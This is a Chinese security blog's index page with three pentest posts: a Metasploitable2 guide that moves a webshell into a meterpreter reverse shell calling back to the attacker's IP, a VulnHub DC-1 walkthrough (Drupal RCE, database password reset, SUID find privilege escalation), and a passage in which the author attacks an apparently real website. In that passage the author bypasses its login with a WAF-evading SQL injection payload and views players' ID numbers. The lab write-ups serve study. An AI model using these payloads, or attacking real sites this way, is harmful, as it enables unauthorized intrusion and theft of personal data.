<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>WebDog</title><meta property="og:type" content="blog"><meta property="og:title" content="WebDog"><meta property="og:url" content="http://yoursite.com/"><meta property="og:site_name" content="WebDog"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://yoursite.com/img/og_image.png"><meta property="article:author" content="WebDog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com"},"headline":"WebDog","image":["http://yoursite.com/img/og_image.png"],"author":{"@type":"Person","name":"WebDog"},"description":""}</script><link rel="icon" href="/img/avatar.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="WebDog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-image"><a class="image is-7by3" href="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/"><img class="thumbnail" src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/15.jpg" alt="蚁剑shell转到meterpreter_shell"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-10-05T08:45:40.000Z" title="2020-10-05T08:45:40.000Z">2020-10-05</time><span class="level-item"><a class="link-muted" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span><span class="level-item">6 分钟 读完 (大约 876 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/">蚁剑shell转到meterpreter_shell</a></h1><div class="content"><a id="more"></a>

<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><blockquote>
<p>在渗透测试的过程中，如果使用蚁剑或菜刀连接上目标主机后，能够得到一个shell，但是我们并不能使用kali里面的meterpreter工具进行后渗透攻击，所以需要将蚁剑的shell迁移到meterpreter中。</p>
</blockquote>
<p><strong>环境准备：</strong></p>
<p>kali：192.168.43.52</p>
<p>Metasploitable2：192.168.43.41</p>
<h2 id="0x2-蚁剑shell"><a href="#0x2-蚁剑shell" class="headerlink" title="0x2 蚁剑shell"></a>0x2 蚁剑shell</h2><p>这里首先需要使用蚁剑连接上目标主机。</p>
<p>使用nmap扫描Metasploitable2主机开放的端口后，发现80端口，用浏览器访问，然后打开DVWA，用户名和密码分别是admin/password，进去后先将难度调到 low 级别，然后找到文件上传模块上传一句话木马，最后使用蚁剑连接，拿到shell。</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/1.jpg" alt="1"></p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/2.jpg" alt="2"></p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/4.jpg" alt="4"></p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/5.jpg" alt="5"></p>
<h2 id="0x3-meterpreter-shell"><a href="#0x3-meterpreter-shell" class="headerlink" title="0x3 meterpreter shell"></a>0x3 meterpreter shell</h2><p>在拿到蚁剑的shell之后，不能使用Metasploit框架来进行后渗透工作，所以需要将shell迁移到kali中。</p>
<p><strong>思路：</strong>用msfvenom工具来生成一个木马文件，然后将木马上传到目标主机上并执行，反弹一个meterpreter shell。</p>
<p><strong>信息收集：</strong></p>
<blockquote>
<p>使用msfvenom工具生成木马时需要知道目标主机的相关版本信息。</p>
</blockquote>
<p>查看目标主机的内核版本和发行版本：</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/6.jpg" alt="6"></p>
<p>i686是属于x86系列。</p>
<p><strong>生成木马：</strong></p>
<p>根据目标主机的信息查找payload：</p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep linux | grep x86</span><br></pre></td></tr></table></figure>

<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/7.jpg" alt="7"></p>
<p>这里我们选择linux/x86/meterpreter/reverse_tcp这个payload，因为我们需要目标主机反弹回一个meterpreter shell。<br>使用msfvenom生成木马：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.43</span><span class="number">.52</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br><span class="line"><span class="comment">// LHOST和LPORT是设置木马程序要连接的ip和端口，-f是设置文件格式（elf表示为linux下的可执行文件）</span></span><br></pre></td></tr></table></figure>

<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/8.jpg" alt="8"></p>
<p><strong>上传木马：</strong></p>
<p>将木马文件通过蚁剑上传到目标主机的tmp目录，因为tmp目录中的文件一般都是可执行的，我这里是先将shell.elf拖到本机，然后再拖到蚁剑里面的，直接从kali虚拟机拖到蚁剑可能会报错；</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/9.jpg" alt="9"></p>
<p>修改文件权限为可执行：</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/10.jpg" alt="10"></p>
<p><strong>开启监听：</strong></p>
<p>在kali中开启msf的监听模块，等待目标主机连接；</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/11.jpg" alt="11"></p>
<p>exploit/multi/handler模块：</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/12.jpg" alt="12"></p>
<p>这个模块是一个通用模块，它可以根据你设置的payload来进行漏洞利用。比如我们在这里设置了反弹shell的payload，那么它就会在kali上开启监听，等待目标主机运行木马程序进行连接。 </p>
<p><strong>getshell：</strong></p>
<p>直接在蚁剑的shell上运行木马文件，kali主机这边就会拿到一个meterpreter shell。</p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/13.jpg" alt="13"></p>
<p><img src="/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/14.jpg" alt="14"></p>
<h2 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h2><p>在拿到蚁剑的shell后，不方便进行后续的渗透工作，所以需要想办法将shell反弹到kali主机上。这里是利用木马程序来反弹shell。</p>
<p><strong>参考文章：</strong></p>
<p><a href="https://www.youtube.com/watch?v=TCkniccL_QU">https://www.youtube.com/watch?v=TCkniccL_QU</a> </p>
<p><a href="https://www.cnblogs.com/bmjoker/p/10051014.html">https://www.cnblogs.com/bmjoker/p/10051014.html</a> </p>
<p><a href="https://paper.seebug.org/29/">https://paper.seebug.org/29/</a> </p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/VulnHub-DC-1/"><img class="thumbnail" src="/VulnHub-DC-1/33.jpg" alt="VulnHub_DC-1"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-09-28T10:56:05.000Z" title="2020-09-28T10:56:05.000Z">2020-09-28</time><span class="level-item"><a class="link-muted" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span><span class="level-item">18 分钟 读完 (大约 2674 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/VulnHub-DC-1/">VulnHub_DC-1</a></h1><div class="content"><a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>获取靶机IP：</strong></p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure>

<img src="/VulnHub-DC-1/1.jpg" alt="1" style="zoom: 150%;">

<p>获取靶机IP：192.168.22.114</p>
<p><strong>端口扫描：</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O <span class="number">192.168</span><span class="number">.22</span><span class="number">.114</span></span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/2.jpg" alt="2"></p>
<p>开放端口：22（ssh）、80（http）、111（nfs共享）</p>
<p>rpcbind是一个RPC服务，主要是在nfs（网络文件系统）共享时候负责通知客户端和服务器。简单理解rpc就是一个中介服务。</p>
<p>先从web入手，访问80端口：</p>
<p>发现网站使用的CMS是Drupal 7，并且网站的环境是PHP。</p>
<p><img src="/VulnHub-DC-1/3.jpg" alt="3"></p>
<p>首先尝试弱口令和万能密码，登录失败。</p>
<p><strong>扫描目录：</strong></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pytho<span class="symbol">n3</span> dirsearch.py -u http:<span class="comment">//192.168.22.114/ -e php</span></span><br></pre></td></tr></table></figure>

<p>扫描发现robots.txt文件，打开查看：</p>
<p><img src="/VulnHub-DC-1/5.jpg" alt="5"></p>
<p>没有什么十分有用的信息。查看一些其他文件，大概确定Drupal的版本是7.x。</p>
<p><img src="/VulnHub-DC-1/6.jpg" alt="6"></p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>上网查找Drupal 7.x的漏洞，发现：<a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">CVE-2018-7600 DRUPAL 7.X 版本代码执行</a>；在Metasploit库中查找CVE-2018-7600，发现exploit脚本，配置好后直接exploit，获得shell。</p>
<p><img src="/VulnHub-DC-1/7.jpg" alt="7"></p>
<p><img src="/VulnHub-DC-1/8.jpg" alt="8"></p>
<p>查看当前用户：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">getuid</span></span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/10.jpg" alt="10"></p>
<p>权限是普通网站用户。</p>
<p>接下来要做的就是提升用户权限。</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先使用MSF的辅助提权模块查找目标主机上有哪些本地提权漏洞：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span> <span class="keyword">post</span>/multi/recon/local_exploit_suggester  <span class="comment">// 查看目标主机存在哪些本地提权漏洞</span></span><br></pre></td></tr></table></figure>

<p> <img src="/VulnHub-DC-1/11.jpg" alt="11"></p>
<p>没有找到可以用来提权的模块。</p>
<p>Metasploit的post模块：</p>
<p><a href="https://blog.csdn.net/weixin_41598660/article/details/104442503">后渗透学习之Metasploit的post模块使用信息收集</a></p>
<p><a href="https://www.jianshu.com/p/c6802c4f03e2">POST模块、后门</a></p>
<p>进入shell后，先用python建立一个虚拟终端，然后就可以使用su等命令了。 </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">'import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)'</span><br><span class="line">// python -c <span class="symbol">'import</span> pty;pty.spawn(<span class="string">"/bin/bash"</span>)'</span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/13.jpg" alt="13"></p>
<img src="/VulnHub-DC-1/14.jpg" alt="14" style="zoom:200%;">



<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>查看当前目录和目录下的文件，发现flag1.txt；</p>
<p><img src="/VulnHub-DC-1/12.jpg" alt="12"></p>
<p>查看flag1.txt文件中的内容。</p>
<p><img src="/VulnHub-DC-1/15.jpg" alt="15"></p>
<p><img src="/VulnHub-DC-1/16.jpg" alt="16"></p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>上网找Drupal 7 CMS的配置文件路径：/sites/default/settings.php</p>
<p><img src="/VulnHub-DC-1/17.jpg" alt="17"></p>
<p>查找配置文件；</p>
<p><img src="/VulnHub-DC-1/18.jpg" alt="18"></p>
<p>查看配置文件，发现flag2和连接数据库的用户名和密码，并且是mysql数据库。</p>
<p><img src="/VulnHub-DC-1/19.jpg" alt="19"></p>
<p>这里/sites/default/目录下还有一个default.settings.php，里面内容和settings.php几乎一样，可能是程序自带的默认配置文件或配置文件的备份。<br>尝试登录数据库：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line"><span class="comment">// 密码是R0ck3t</span></span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/20.jpg" alt="20"></p>
<p>成功连接。</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>查看当前数据库用户的权限：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mysql</span>&gt; <span class="selector-tag">show</span> <span class="selector-tag">grants</span> <span class="selector-tag">for</span> <span class="selector-tag">dbuser</span><span class="keyword">@localhost</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/21.jpg" alt="21"></p>
<p>意思是：” *.*授予dbuser’@’localhost’的授权使用通过密码&lt;secret&gt;标识，将所有特权授予`drupaldb`.*至‘dbuser’@’localhost’ “，也就是dbuser用户可以管理drupaldb数据库下的所有表（包括增删改查操作）。</p>
<p><a href="https://blog.csdn.net/Dzq_Boyka/article/details/80338889">数据库查看当前用户角色、权限</a></p>
<p>查看数据库，查看表：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> drupaldb;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/22.jpg" alt="22"></p>
<p>查看一些特殊表，发现一些重要信息；</p>
<p><img src="/VulnHub-DC-1/23.jpg" alt="23"></p>
<p>这里只看到了admin用户（webdemo用户是我测试时添加的）和flag3，没有admin用户的密码的明文和flag3的内容。没有思路了，看了大佬的文章，说是flag3的内容可能是在后台管理页面上，因为这里的flag3是title字段，所以title的内容很有可能就在后台页面；并且这里可以通过修改管理员admin的密码的方式登录后台，在这之前我们查看了数据库用户dbuser的权限，是可以修改users表的。</p>
<p>重置管理员密码：<a href="https://www.isfirst.net/drupal/drupal-reset-password">https://www.isfirst.net/drupal/drupal-reset-password</a> </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update users <span class="built_in">set</span> pass=<span class="string">"<span class="variable">$S</span><span class="variable">$DRIG34Wb</span>.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4"</span> <span class="built_in">where</span> name=<span class="string">"admin"</span>;</span><br><span class="line">// <span class="variable">$S</span><span class="variable">$DRIG34Wb</span>.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4解密后为123456</span><br><span class="line">// <span class="variable">$S</span><span class="variable">$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v</span>解密后为drupal</span><br></pre></td></tr></table></figure>

<p>然后打开后台登录界面，输入admin，123456，成功登录。</p>
<p><img src="/VulnHub-DC-1/25.jpg" alt="25"></p>
<p>接下来就是找flag3，藏的还是比较隐蔽的，我找了好久才找到；</p>
<p><img src="/VulnHub-DC-1/26.jpg" alt="26"></p>
<p><img src="/VulnHub-DC-1/27.jpg" alt="27"></p>
<p><img src="/VulnHub-DC-1/28.jpg" alt="28"></p>
<p>这里我也尝试过通过添加用户的方式来登入后台，但是进入后台后并没有什么有价值的信息。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  update<span class="built_in"> users </span><span class="builtin-name">set</span> <span class="attribute">pass</span>=<span class="string">"<span class="variable">$S</span><span class="variable">$DRIG34Wb</span>.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4"</span>, <span class="attribute">status</span>=<span class="string">"1"</span> where <span class="attribute">name</span>=<span class="string">"webdemo"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/VulnHub-DC-1/29.jpg" alt="29"></p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>flag3提示密码，先去查看linux的密码文件；</p>
<p><img src="/VulnHub-DC-1/30.jpg" alt="30"></p>
<p>发现flag4，去查看flag4；</p>
<p><img src="/VulnHub-DC-1/31.jpg" alt="31"></p>
<p>提示以同样的方式查看root目录下面的flag文件。如果直接cd /root，会提示Permission denied，意思就是权限不够，需要提升至root权限。</p>
<p>之前尝试过使用本地漏洞提权，但发现没有可以利用的本地漏洞。这里根据flag3的提示，可以使用命令来获取内容，小白本白又跑去看大佬的思路，发现可以使用find命令提权。</p>
<p>首先查看有没有设置了SUID并且权限为root的文件：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm <span class="number">-4000</span> -user <span class="string">"root"</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br><span class="line"><span class="comment">// 4000表示SUID，-user表示文件所属主</span></span><br></pre></td></tr></table></figure>

<p>-perm -4000 是在系统中查找所有设置了SUID的文件，设置了SUID的文件在执行时权限为文件所属主的权限。查找这类文件的作用是为了找到设置了SUID并且所属主为root的可执行文件（二进制文件），这类可执行文件在被任何用户执行时都具有root权限。</p>
<p><a href="https://blog.csdn.net/weixin_43803070/article/details/94759234">linux下根据文件权限查找文件</a></p>
<p><a href="https://blog.csdn.net/gramdog/article/details/80374119">Shell中 2&gt;/dev/null</a></p>
<p><a href="https://www.jianshu.com/p/4ea1e6aa2aa7">Linux特殊权限之SUID</a></p>
<p><img src="/VulnHub-DC-1/32.jpg" alt="32"></p>
<p>这里的find命令（文件）可以用来提权。</p>
<p><strong>find命令原理：</strong></p>
<p>find命令有一个-exec参数，可以在成功查找到文件后对匹配的文件执行该参数设置的shell命令。这里需要注意的是find必须要查找成功后才能触发-exec参数，也就是说你要find的那个文件必须存在，否则会报错。</p>
<img src="/VulnHub-DC-1/34.jpg" alt="34" style="zoom:200%;">

<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">-exec 命令 </span><span class="template-variable">&#123;&#125;</span><span class="xml"> \;（注意</span><span class="template-variable">&#123;&#125;</span><span class="xml">两边必须要有空格，\转义;）//对查找到的文件执行某命令；-exec表示开始执行动作,</span><span class="template-variable">&#123;&#125;</span><span class="xml">表示用find命令查找出的所有文件</span></span><br></pre></td></tr></table></figure>

<p>因为这里find命令设置了SUID，所以在利用find命令的-exec参数去执行shell命令的时候是在root权限下执行。</p>
<p><img src="/VulnHub-DC-1/35.jpg" alt="35"></p>
<p>因为-exec一次只能执行一条命令，所以我刚开始的想法是将命令写入一个文件，然后传给-exec去执行，但是好像不能创建文件；这里我也尝试使用-exec去创建文件，发现也没成功，不知道是什么原因，希望大佬们指点指点！而且还需要给文件授予可执行权限。</p>
<img src="/VulnHub-DC-1/36.jpg" alt="36" style="zoom:200%;">

<p><a href="https://linux.cn/article-10549-1.html?pr">在 Linux 上创建文件的 10 个方法</a></p>
<p>这里另外的一个解决办法就是直接执行一个shell终端，比如/bin/bash，/bin/sh。</p>
<p><img src="/VulnHub-DC-1/37.jpg" alt="37"></p>
<p>执行后会得到一个root权限的shell，直接切换到/root目录，查看thefinalflag.txt文件。</p>
<p>这里还有一个问题，如果执行/bin/bash返回的shell并不是root权限，提权没有成功。希望大佬能够指点指点。</p>
<img src="/VulnHub-DC-1/38.jpg" alt="38" style="zoom:200%;">



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>拿到靶机后，首先需要获取靶机的ip，然后可以探测网站开放的端口或者访问网站查看web服务。先去看web服务有没有什么漏洞，比如登录注册入口是否存在SQL注入，弱口令，万能密码，验证码可复用，用户锁定等，前台上传头像处是否可以上传图片马，同时也可以查看网站服务器版本和使用的脚本语言以及CMS版本信息等，如果没地方入手就扫一下网站目录，或者查看网页源码，看是否有一些特殊或奇怪的路径，然后去网上（Shodan、fafo）查找有没有项目源码，如果有的话就下载到本地直接审计，找漏洞。当然也可以从网站服务入手，根据端口扫描的结果可以得到网站开放的服务，可以去网上找相关版本的服务漏洞，然后就是Poc验证，exploit利用。信息收集的目的是尽可能多地了解网站，不断发掘漏洞和利用点，然后再一个一个去验证。找到漏洞或利用点后，就要想办法获得一个shell，哪怕是低权限的shell；如果能够进入后台就找上传点，上传木马然后用蚁剑连接getshell。像SQL注入这类漏洞可以自己写自动化利用脚本，像CVE这些弄懂原理之后可以直接上Metasploit框架，当然感兴趣的话可以自己复现一遍。拿到shell后，如果权限比较低的话就要想办法提权，先看看post/multi/recon/local_exploit_suggester模块有没有可以直接利用的本地提权漏洞，如果没有的话就得想其他办法了，提权这块我不太会，所以就不献丑了，直接献上大佬的文章：<a href="https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g">https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g</a> 。</p>
<p>看了大佬的文章，发现自己水平还是很菜，得多向大佬多学习，我发现学得越多就觉得自己要学的东西越多。如果你是大佬，带带弟弟，哈哈哈哈哈~</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g">https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g</a> </p>
<p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/</a></p>
<p><a href="https://blog.csdn.net/weixin_41598660/article/details/104442503">https://blog.csdn.net/weixin_41598660/article/details/104442503</a></p>
<p><a href="https://www.jianshu.com/p/c6802c4f03e2">https://www.jianshu.com/p/c6802c4f03e2</a></p>
<p><a href="https://blog.csdn.net/Dzq_Boyka/article/details/80338889">https://blog.csdn.net/Dzq_Boyka/article/details/80338889</a></p>
<p><a href="https://www.isfirst.net/drupal/drupal-reset-password">https://www.isfirst.net/drupal/drupal-reset-password</a> </p>
<p><a href="https://blog.csdn.net/weixin_43803070/article/details/94759234">https://blog.csdn.net/weixin_43803070/article/details/94759234</a></p>
<p><a href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a></p>
<p><a href="https://www.jianshu.com/p/4ea1e6aa2aa7">https://www.jianshu.com/p/4ea1e6aa2aa7</a> </p>
<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a></p>
<p><a href="https://linux.cn/article-10549-1.html?pr">https://linux.cn/article-10549-1.html?pr</a></p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/"><img class="thumbnail" src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/29.jpg" alt="第一次日站~"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-09-20T14:45:26.000Z" title="2020-09-20T14:45:26.000Z">2020-09-20</time><span class="level-item"><a class="link-muted" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span><span class="level-item">14 分钟 读完 (大约 2041 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/">第一次日站~</a></h1><div class="content"><a id="more"></a>

<blockquote>
<p>小白第一次X站，没有什么技术含量，大佬们轻点打！</p>
</blockquote>
<p> <img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/1.gif" alt="1"> </p>
<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>Google搜索拿到网站后台：</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/1.jpg" alt="1"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/2.jpg" alt="2"></p>
<h2 id="0x2-后台登陆"><a href="#0x2-后台登陆" class="headerlink" title="0x2 后台登陆"></a>0x2 后台登陆</h2><p>进入后台页面需要先绕过登陆。首先尝试跨目录访问，看看能不能越权访问admin目录（我之前有一次就是直接删减url访问admin目录进入后台的），额，设置了权限，禁止访问。接着就是弱口令一把梭，发现还是绕不过去。然后就是万能密码，这里我是用万能密码绕过的。</p>
<p>直接输入用户名：admin’  #，密码随便输，但必须要大于两个字符，否则会报错；输入完成之后会报错，并且直接爆出SQL查询语句；</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/3.jpg" alt="3"></p>
<p>发现这里的#并没有起到注释的作用，根据sql语句重新构造：admin’ or ‘1’=’1，这样sql语句就变成：select ID,name,pass from admin where name=’admin’ or ‘1’=’1’ And pass=’65DED5353C5EE48D0B7D48C591B8F430’ ，提示包含非法字符，应该是有WAF，检测到or关键字；</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/4.jpg" alt="4"></p>
<p>(⊙﹏⊙)额，没啥思路了，去看了一下网站的服务器，发现是windows的IIS服务器；<br><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/5.jpg" alt="5" style="zoom:200%;"></p>
<p>想到了windows系统%00截断的特性。用burpsuite抓包，在or后面加上%00，发现后面的’1’=’1没有了，说明存在00截断。重新构造payload：uName=admin%27+or’%00+%271%27%3D%271&amp;uPass=123，构造后查询语句变成：select ID,name,pass from admin where name=’admin’ or ‘’ And pass=’65DED5353C5EE48D0B7D48C591B8F430’，这样就可以绕过后面的密码验证，同时还能绕过WAF的检测，WAF一般都是正则匹配关键字；然后重新发包，发现页面发生变化，不提示sql语句错误和非法字符，应该是进入后台了。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/7.jpg" alt="7"></p>
<p>将payload复制到抓取的数据包中，然后forward，打开浏览器查看，发现已经进入后台。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/8.jpg" alt="8"></p>
<p>拿下后台后，看看有没有可利用的信息。</p>
<p><strong>密码修改：</strong></p>
<p>发现在系统管理模块可以直接修改管理员密码，而且不需要验证旧密码，直接输入新密码即可修改。而且还可以添加管理员用户。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/9.jpg" alt="9"></p>
<p><strong>查看敏感信息：</strong></p>
<p>在围棋棋手管理管理模块，可以查看棋手的身份证号码。</p>
